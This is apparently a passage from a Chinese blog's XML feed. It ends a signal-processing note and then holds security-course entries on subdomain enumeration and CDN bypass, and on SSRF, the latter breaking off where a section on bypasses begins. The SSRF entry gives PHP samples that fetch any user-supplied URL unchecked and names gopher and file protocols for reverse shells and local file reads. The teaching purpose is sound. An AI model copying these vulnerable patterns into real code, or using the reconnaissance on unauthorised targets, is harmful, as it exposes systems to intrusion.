xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>δ</mi><mtext>函数：冲激序列</mtext></mrow><annotation encoding="application/x-tex">\delta函数：冲激序列</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.03785em;">δ</span><span class="mord cjk_fallback">函</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">：</span><span class="mord cjk_fallback">冲</span><span class="mord cjk_fallback">激</span><span class="mord cjk_fallback">序</span><span class="mord cjk_fallback">列</span></span></span></span></p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221005173756760.png" alt="image-20221005173756760" style="zoom:50%;" /><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221007164937335.png" alt="image-20221007164937335" style="zoom:50%;" /><h2 id="例1">例1</h2><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221007172634617.png" alt="image-20221007172634617" style="zoom:50%;" /><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221007172543799.png" alt="image-20221007172543799" style="zoom:50%;" /><p><strong>结论：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>δ</mi><mtext>序列出来的还是一个</mtext><mi>δ</mi><mtext>序列</mtext></mrow><annotation encoding="application/x-tex">\delta序列出来的还是一个\delta序列</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.03785em;">δ</span><span class="mord cjk_fallback">序</span><span class="mord cjk_fallback">列</span><span class="mord cjk_fallback">出</span><span class="mord cjk_fallback">来</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">还</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord mathdefault" style="margin-right:0.03785em;">δ</span><span class="mord cjk_fallback">序</span><span class="mord cjk_fallback">列</span></span></span></span></strong></p><h2 id="例2">例2</h2><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221007173027620.png" alt="image-20221007173027620" style="zoom:50%;" /><h2 id="级数和变换的关系">级数和变换的关系</h2><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221007173220040.png" alt="image-20221007173220040" style="zoom:50%;" /><h2 id="总结">总结</h2><ul><li>公式1：周期信号展开成傅里叶级数从而求得系数，再通过系数由级数求出傅里叶变换</li><li>公式2：把一个周期信号理解成一个基本信号，将整个周期信号理解成一个基本信号和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>δ</mi></mrow><annotation encoding="application/x-tex">\delta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.03785em;">δ</span></span></span></span>序列的卷积。从而，根据时域的卷积等于频域的乘法运算。</li></ul><h1>总结</h1>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 通信原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>子域名深度挖掘</title>
      <link href="/2022/10/30/%E5%AD%90%E5%9F%9F%E5%90%8D%E6%B7%B1%E5%BA%A6%E6%8C%96%E6%8E%98/"/>
      <url>/2022/10/30/%E5%AD%90%E5%9F%9F%E5%90%8D%E6%B7%B1%E5%BA%A6%E6%8C%96%E6%8E%98/</url>
      
        <content type="html"><![CDATA[<h2 id="子域名深度挖掘"><a href="#子域名深度挖掘" class="headerlink" title="子域名深度挖掘"></a>子域名深度挖掘</h2><p>[TOC]</p><h3 id="前言"><a href="#前言" class="headerlink" title="前言:"></a>前言:</h3><p>企业可能有多个、几十个甚至很多的子域名应用，因为子域名数量多，企业在人员和防护的投入可能会没有主站及时。攻击者在主域名找不到突破口时，就可以进行子域名的信息收集，然后通过子域名的漏洞进行迂回。</p><p><del>例如:<a href="http://www.qfnu.edu.cn主域不存在漏洞,并且防护措施严密,而二级域名/">www.qfnu.edu.cn主域不存在漏洞，并且防护措施严密，而二级域名</a> jsj.qfnu.edu.cn存在漏洞，防护措施松散，可以采用迂回战术拿下子域名，然后逐步靠近主域。</del></p><blockquote><p style="color:orange;">目的：核心目标久攻不下，从侧面展开攻击并逐步获取核心目标权限</p></blockquote><h3 id="一、前置知识"><a href="#一、前置知识" class="headerlink" title="一、前置知识"></a>一、前置知识</h3><h4 id="1-1-域名类别"><a href="#1-1-域名类别" class="headerlink" title="1.1 域名类别"></a>1.1 域名类别</h4><img src="./子域名深度挖掘/域名分类.png" alt="" style="zoom:50%;" /><center>1-1 域名分类</center>#### 1.2 子域名<p>子域名是在域名系统等级中属于更高一层域的域。比如：jsj.qfnu.edu.cn和da.qfnu.edu.cn是qfnu.edu.cn的两个子域。</p><img src="./子域名深度挖掘/攻击阶段列举.png" style="zoom:80%;" /><center>1-2 渗透测试阶段举例</center>在网络攻防的过程中，信息收集是非常重要的一步， 通过信息收集可以了解渗透目标的网络架构，描述出相关 的网络拓扑，缩小攻击范围。只有将目标的相关信息收集 完整，才可以对攻击目标开启的主机及主机安装运行的应 用，针对性的进行有效攻击。我们要讲的内容子域名深度挖掘实际上只是其中一部分，还有像whois域名注册信息查询，网站后台(敏感/备份文件&目录)扫描，whois查询和反查/IP查询和反查/C段查询， Email信息收集， WEB指纹识别&WEB后台扫描等众多的内容<p>为了保证网络的稳定网站服务商会在网络的不同位置设置节点服务器，通过 CDN技术，将网络请求分发到最优的节点服务器上面。</p><h4 id="1-3-CDN判断与绕过"><a href="#1-3-CDN判断与绕过" class="headerlink" title="1.3 CDN判断与绕过"></a>1.3 CDN判断与绕过</h4><p>当CDN技术成熟时，不只是正常用户部署有CDN，比如服务器部署正国外的<del>不法网站</del>往往会采用国内的CDN，使国内用户访问。</p><blockquote><p style="color:red;">站长工具：http://ping.chinaz.com/</p><p style="color:red;">爱站网：https://ping.aizhan.com/</p><p style="color:red;">国外 ping 探测：https://asm.ca.com/en/ping.php</p></blockquote><p>利用站长工具对<a href="http://www.baidu.com多地探测返回的结果,发现有多达15个不同的ip,www.baidu.com同时有显示cdn提供商为百度云加速,这个应该算理所当然,百度没cdn才属于离谱./">www.baidu.com多地探测返回的结果，发现有多达15个不同的IP,www.baidu.com同时有显示CDN提供商为百度云加速，这个应该算理所当然，百度没CDN才属于离谱。</a></p><h5 id="nslookup域名解析"><a href="#nslookup域名解析" class="headerlink" title="nslookup域名解析"></a>nslookup域名解析</h5><p>通过系统自带的【nslookup】命令对域名解析, 发现有【39.156.66.18】和【39.156.66.14】两个 不同的IP,说明【<a href="http://www.baidu.com】可能使用了cdn./">www.baidu.com】可能使用了CDN。</a></p><h5 id="有CDN例子"><a href="#有CDN例子" class="headerlink" title="有CDN例子"></a>有CDN例子</h5><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># www.abc.com</span><span class="token comment"># 服务器:public1.114dns.com</span><span class="token comment"># Address: 114.114.114.114 </span>非权威应答：<span class="token comment"># 名称:abc.xdwscache.ourglb0.com</span><span class="token comment"># Addresses: 58.223.164.86 125.75.32.252</span><span class="token comment"># Aliases: www.abc.com</span><span class="token comment"># www.abc.com.lxdns.com</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="无CDN例子"><a href="#无CDN例子" class="headerlink" title="无CDN例子"></a>无CDN例子</h5><pre class="line-numbers language-php" data-language="php"><code class="language-php">abc<span class="token operator">.</span>com服务器<span class="token punctuation">:</span>public1<span class="token operator">.</span><span class="token number">114</span>dns<span class="token operator">.</span>comAddress<span class="token punctuation">:</span> <span class="token number">114.114</span><span class="token number">.114</span><span class="token number">.114</span>非权威应答：名称<span class="token punctuation">:</span>abc<span class="token operator">.</span>comAddress<span class="token punctuation">:</span> <span class="token number">192.12</span><span class="token number">.168</span><span class="token number">.172</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="1-4-绕过CDN获取真实IP"><a href="#1-4-绕过CDN获取真实IP" class="headerlink" title="1.4 绕过CDN获取真实IP"></a>1.4 绕过CDN获取真实IP</h4><h5 id="查询子域名"><a href="#查询子域名" class="headerlink" title="查询子域名"></a>查询子域名</h5><blockquote><p style="color:skyblue;">子域名可能跟主站在同一个服务 器或者同一个C段网络中，可以通过子 域名探测的方式，收集目标的子域名 信息,通过查询子域名的IP信息来辅助 判断主站的真实IP信息。</p></blockquote><p>作用：IP/域名-&gt;同网段下的IP<br>通过IP或域名可以查询同网段的不同IP ，查询手段：webscan或其他工具   <a href="https://www.webscan.cc/">https://www.webscan.cc/</a></p><h5 id="使用国外主机解析域名"><a href="#使用国外主机解析域名" class="headerlink" title="使用国外主机解析域名"></a>使用国外主机解析域名</h5><p>探测的方式也有两种，一种是利用 自己已有的境外的主机直接进行探测, 另一种如果没有国外主机可以利用公开的多地ping服务，多地ping服务有国外的探测节点，可以利用国外节点的返回信息来判断真实的IP信息。</p><h5 id="网站漏洞"><a href="#网站漏洞" class="headerlink" title="网站漏洞"></a>网站漏洞</h5><p>利用网站存在的漏洞，信息泄露的敏感信息、文件，如phpinfo文件、网站源码文件、Github泄露的信息等都可能会将真实的IP信息泄露。</p><p>邮件的信息中会记录邮件服务器的IP信息，有些站点有类似于RSS邮件订阅可以发送邮件的功能，可以利用其发送的邮件，通过查看源码的方式查看真实服务器的IP信息。</p><img src="./子域名深度挖掘/获取子域名的方式.png" style="zoom:67%;" /><center><p>1-3  获取子域名的方式</p></center>### 二、挖掘工具<h4 id="2-1子域名挖掘手段"><a href="#2-1子域名挖掘手段" class="headerlink" title="2.1子域名挖掘手段"></a>2.1子域名挖掘手段</h4><ul><li>DNS域传送漏洞发现子域名（这个漏洞比较早现在已经有很少应用）</li><li>搜索引擎发现子域名</li><li>证书透明性信息发现子域名</li><li>第三方聚合服务发现子域名</li><li>子域名枚举发现子域名</li></ul><h4 id="2-2-DNS域传送"><a href="#2-2-DNS域传送" class="headerlink" title="2.2 DNS域传送"></a>2.2 DNS域传送</h4><p>作为重要的互联网基础设施，难免成为黑客的重点攻击目标，服务的稳定性尤为重要。DNS服务器分为：主服务器、备份服务器和缓存服务器。在主备服务器之间同步数据库，需要使用“DNS域传送”。域传送是指后备服务器从主服务器拷贝数据，并用得到的数据更新自身数据库<br>若DNS服务器配置不当，可能导致匿名用户获取某个域的所有记录。造成整个网络的拓扑结构泄露给潜在的攻击者，包括一些安全性较低的内部主机，如测试服务器。凭借这份网络蓝图，攻击者可以节省很少的扫描时间。<br>大的互联网厂商通常将内部网络与外部互联网隔离开，一个重要的手段是使用Private DNS。如果内部DNS泄露，将造成极大的安全风险。风险控制不当甚至造成整个内部1网络沦陷。<br>当然这个漏洞非常鸡肋，只有大公司会用Private DNS服务器，但是一个古老漏洞，会出现问题的可能性不大。</p><h4 id="2-3-搜索引擎发现子域名"><a href="#2-3-搜索引擎发现子域名" class="headerlink" title="2.3 搜索引擎发现子域名"></a>2.3 搜索引擎发现子域名</h4><blockquote><p style="color:blue;">搜索语法：site:baidu.com</p></blockquote><p>site语法设定的初衷是为了实现精准搜索。索引结果数不是一个网站在搜索引擎中的站点评级指标。搜索结果中URL后面的时间戳不必太过关注。site语法查询的检索结果只能说明网页被收录。<br>site：后面带不带www结果可能是不一样的，因为有些域名还包括二级域名，如：site：www。某某。com和site：某某。com，搜索结果就不一样，site：和站点名之间，不要带空格。</p><p><strong>搜索引擎发现子域名（拓展）</strong></p><blockquote><p>url前不能带http:// , 现在Google搜索可以带http:// Google会自动忽略，百度依然不能忽略带”http://“的搜索。</p></blockquote><blockquote><p>搜索引擎 site:<a href="http://www.sina.com.cn/">http://www.sina.com.cn</a></p></blockquote><p style="color:red;">Google结果：所有网站 www.sina. com.cn 上约有1660项符合 搜索引擎的查询结果，以下是第 1 - 10 项。Baidu结果：抱歉，没有找到与“site:ht tp://finance.sina.com.cn” 相关的网页。</p>> 搜索引擎：site:www.sina.com.cn<p>Google结果：所有网站 <a href="http://www.sina.com.cn/">www.sina.com.cn</a> 上约有1660项符合 搜索引擎的查询结果，以下是第 1 - 10 项。<br>Baidu结果：百度一下，找到相关网页约3,210篇，用时0.057秒。B、在过去url后边不能带斜杠“/”，现在Google和Baidu都可以带”/“。</p><p>比如说：https: //crt.sh/ 与 https ://censys.io/</p><p style="color:orange;">因为证书透明性只能查到有证书的网站，所以这里获取的域名一般没问题，而且数量较少。证书透明性获取的子域名数量其实远小于通过搜索引擎获取，一般是作为一些补充。</p>#### 2.4 枚举工具<h5 id="one-for-all"><a href="#one-for-all" class="headerlink" title="one for all"></a>one for all</h5><p>下载地址：<a href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll</a><br>一款集百家之长，功能强大的全面快速子域收集终极神器，收集子域名快速且全面，但要注意一定要配置API，否 则收集的子域名会不够全。<br>注意：这个建议在虚拟机运行，直接用kali linux开个docker把环境加载进去就行。</p><h5 id="Layer子域名挖掘机"><a href="#Layer子域名挖掘机" class="headerlink" title="Layer子域名挖掘机"></a>Layer子域名挖掘机</h5><p>下载地址：<a href="https://github.com/euphrat1ca/LayerDomainFinder">https://github.com/euphrat1ca/LayerDomainFinder</a><br>这个地址下载到的其实是说这个攻击的源代码，如我在课下会把这个工具的正常使用版本放在群里。</p><h5 id="JSFinder"><a href="#JSFinder" class="headerlink" title="JSFinder"></a>JSFinder</h5><p>下载地址：<a href="https://github.com/Threezh1/JSFinder">https://github.com/Threezh1/JSFinder</a> ,一款用作快速在网站的js文件中提取URL，子域名的工具。<br>Knock Subdomain Scan v5.3.0<br>下载地址：<a href="https://github.com/guelfoweb/knock">https://github.com/guelfoweb/knock</a> ,通过字典攻击快速枚举目标域上的子域</p><h5 id="one-for-all-1"><a href="#one-for-all-1" class="headerlink" title="one for all"></a>one for all</h5><p>下载地址：<a href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll</a> </p><blockquote><p>OneForAll基于Python 3.6.0开发和测试，OneForAll需要高于Python 3.6.0的版本才能运行。 安装Python环境可以参考Python 3 安装指南。运行以下命令检查Python和pip3版本：<br>首先下载并编辑配置文件，添加自己的api和个性化设置，并保留原始文件结构<br>config ├ ── api.py ├ ── log.py └── setting.py<br>拉取镜像并执行，其中<del>/.config替换为你自己配置文件所在文件夹的路径<br>docker pull shmilylty/oneforall<br>docker run -it –rm -v ~/results:/OneForAll/results -v ~/.config:/OneForAll/config shmilylty/oneforall –target example.com run<br>参数直接加在指令末尾，结果会输出在本地目录</del>/results，如需保存到其他位置，可以自行修改。<br>如果你是通过pip3安装的依赖则使用以下命令运行示例：<br>python3 oneforall.py –target example.com run<br>python3 oneforall.py –targets ./example.txt run</p></blockquote><h3 id="三、实战演练"><a href="#三、实战演练" class="headerlink" title="三、实战演练"></a>三、实战演练</h3><h3 id="四、总结答疑"><a href="#四、总结答疑" class="headerlink" title="四、总结答疑"></a>四、总结答疑</h3><blockquote><p style="color:red;">本课程及所讲述的所有技术仅能在取得足够合法授权的企业安全建设中使用，在使用学习本课程的过程中，您应确保自己所有行为符合当地的法律法规。 如您在学习本课程后中存在任何非法行为，您将自行承担所有后果，本课程所有开发者和所有贡献者不承担任何法律及连带责任。 除非您已充分阅读、完全理解并接受本协议所有条款，否则，请您不要阅读本课程。 您的阅读行为或者您以其他任何明示或者默示方式表示接受本协议的，即视为您已阅读并同意本协议的约束。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息收集 </tag>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF漏洞原理攻击与防御</title>
      <link href="/2022/10/25/SSRF%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/"/>
      <url>/2022/10/25/SSRF%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/</url>
      
        <content type="html"><![CDATA[<h2 id="SSRF漏洞原理攻击与防御"><a href="#SSRF漏洞原理攻击与防御" class="headerlink" title="SSRF漏洞原理攻击与防御"></a>SSRF漏洞原理攻击与防御</h2><blockquote><p style="color:red;">前言：笔者对SSRF的进一步研究学习基于网络安全爱好者的兴趣，与白帽黑客的责任，仅在专业靶场和补天平台授权站点进行测试。</p></blockquote><p>[TOC]</p><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个漏洞</p><h3 id="一、SSRF漏洞原理："><a href="#一、SSRF漏洞原理：" class="headerlink" title="一、SSRF漏洞原理："></a>一、SSRF漏洞原理：</h3><blockquote><p style="color:blue;"> SSRF漏洞 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。</p></blockquote><center> <img src="https://img-blog.csdnimg.cn/b53de209637a4a88853e1762d639b5d3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6Zu254K55pWy5Luj56CB,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" style="zoom: 67%;" /></center> #### 1.1 SSRF危害<p>端口扫描、内网web应用指纹识别、攻击内网web应用、读取本地文件</p><h3 id="二、SSRF漏洞挖掘"><a href="#二、SSRF漏洞挖掘" class="headerlink" title="二、SSRF漏洞挖掘:"></a>二、SSRF漏洞挖掘:</h3><p>互联网上的很多web应用提供了从其他服务器获取数据的功能。使用用户指定的URL，web应用可以获取图片、文件资源。可以说如果链接可以访问任意请求，则存在ssrf漏洞</p><h4 id="2-1-SSRF可能产生的方式："><a href="#2-1-SSRF可能产生的方式：" class="headerlink" title="2.1 SSRF可能产生的方式："></a>2.1 SSRF可能产生的方式：</h4><ul><li><p> 分享：通过URL地址分享网页内容 </p></li><li><p>在线翻译:通过URL地址翻译对应文本的内容。提供此功能的国内公司有百度、有道等。</p></li><li><p>图片、文章收藏功能:此处的图片、文章收藏中的文章收藏就类似于分享功能中获取URL地址中title以及文本的内容作为显示。</p><blockquote><p><a href="http://title.xxx.com/title?title=http://title.xxx.com/as52ps63de">http://title.xxx.com/title?title=http://title.xxx.com/as52ps63de</a></p></blockquote><p>例如title参数是文章的标题地址，代表了一个文章的地址链接，请求后返回文章是否保存，收藏的返回信息。如果保存，收藏功能采用了此种形式保存文章，则在没有限制参数的形式下可能存在SSRF。</p></li><li><p>图片加载与下载:通过URL地址加载或下载图片，图片加载远程图片地址此功能用到的地方很多，但大多都是比较隐秘，比如在有些公司中的加载自家图片服务器上的图片用于展示。 </p></li><li><p>从URL关键字中寻找，可以通过谷歌语法通过关键字寻找 SSRF漏洞</p><blockquote><p> share、wap、url、link、src、source、target、u、display、sourceURl、imageURL、domain</p></blockquote></li></ul><h4 id="2-2-PHP中可能产生SSRF漏洞的函数："><a href="#2-2-PHP中可能产生SSRF漏洞的函数：" class="headerlink" title="2.2 PHP中可能产生SSRF漏洞的函数："></a>2.2 PHP中可能产生SSRF漏洞的函数：</h4><p><strong>file_get_contents:</strong>     file_get_contents() 把整个文件读入一个字符串中。</p><blockquote><p style="color:red;">file_get_contents(path,include_path,context,start,max_length)</p></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php">#下面的代码使用file_get_contents函数从用户指定的url获取图片。#然后把它用一个随即文件名保存在硬盘上，并展示给用户。<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token variable">$filename</span> <span class="token operator">=</span><span class="token string single-quoted-string">'./images/'</span><span class="token operator">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">';img1.jpg'</span><span class="token punctuation">;</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>         <span class="token variable">$img</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"&lt;img src=\""</span><span class="token operator">.</span><span class="token variable">$filename</span><span class="token operator">.</span><span class="token string double-quoted-string">"\"/>"</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span> <span class="token keyword">echo</span> <span class="token variable">$img</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> <strong>sockopen():</strong>     使用socket跟服务器建立tcp连接，传输原始数据。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"># 以下代码使用fsockopen函数实现获取用户制定url的数据# 这个函数会使用socket跟服务器建立tcp连接，传输原始数据。<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">function</span> <span class="token function-definition function">GetFile</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">,</span><span class="token variable">$port</span><span class="token punctuation">,</span><span class="token variable">$link</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$fp</span> <span class="token operator">=</span> <span class="token function">fsockopen</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">,</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$port</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$errno</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$errstr</span></span> (error number <span class="token interpolation"><span class="token variable">$errno</span></span>) \n"</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token variable">$out</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"GET <span class="token interpolation"><span class="token variable">$link</span></span> HTTP/1.1\r\n"</span><span class="token punctuation">;</span>            <span class="token variable">$out</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"Host: <span class="token interpolation"><span class="token variable">$host</span></span>\r\n"</span><span class="token punctuation">;</span>            <span class="token variable">$out</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"Connection: Close\r\n\r\n"</span><span class="token punctuation">;</span>            <span class="token variable">$out</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"\r\n"</span><span class="token punctuation">;</span>             <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token variable">$out</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token variable">$contents</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>             <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$contents</span><span class="token operator">.=</span> <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token punctuation">&#125;</span>            <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token keyword">return</span> <span class="token variable">$contents</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>3、curl_exec():</strong> curl_exec — 执行一个cURL会话</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$link</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$curlobj</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curlobj</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_POST</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curlobj</span><span class="token punctuation">,</span><span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span><span class="token variable">$link</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curlobj</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$curlobj</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$curlobj</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment"># 详细注释版本见web351</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'./curled/'</span><span class="token operator">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'.txt'</span><span class="token punctuation">;</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token variable">$result</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-4-相关协议"><a href="#2-4-相关协议" class="headerlink" title="2.4 相关协议"></a>2.4 相关协议</h4><p>file协议： 在有回显的情况下，利用 file 协议可以读取任意文件的内容</p><p>dict协议：泄露安装软件版本信息，查看端口，操作内网redis服务等</p><p>gopher协议：gopher支持发出GET、POST请求。可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell</p><p>http/s协议：探测内网主机存活</p><h3 id="三、SSRF利用"><a href="#三、SSRF利用" class="headerlink" title="三、SSRF利用:"></a>三、SSRF利用:</h3><blockquote><p style="color:blue;">可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;<p style="color:blue;">攻击运行在内网或本地的应用程序（比如溢出）;<p style="color:blue;">对内网web应用进行指纹识别，通过访问默认文件实现;<p style="color:blue;">攻击内外网的web应用，主要是使用get参数就可以实现的攻击（比如struts2，sqli等）;<p style="color:blue;">利用file协议读取本地文件等。各个协议调用探针：http,file,dict,ftp,gopher等</blockquote><h3 id="四、SSRF漏洞防御："><a href="#四、SSRF漏洞防御：" class="headerlink" title="四、SSRF漏洞防御："></a>四、SSRF漏洞防御：</h3><p>通常有以下5个思路：</p><ol><li><p>过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p></li><li><p>统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</p></li><li><p>限制请求的端口为http常用的端口，比如，80,443,8080,8090。</p></li><li><p>黑名单内网ip。避免应用被用来获取获取内网数据，攻击内网。</p></li><li><p>禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:///,gopher://,ftp:// 等引起的问题。</p></li></ol><h3 id="五、SSRF漏洞常见绕过方式："><a href="#五、SSRF漏洞常见绕过方式：" class="headerlink" 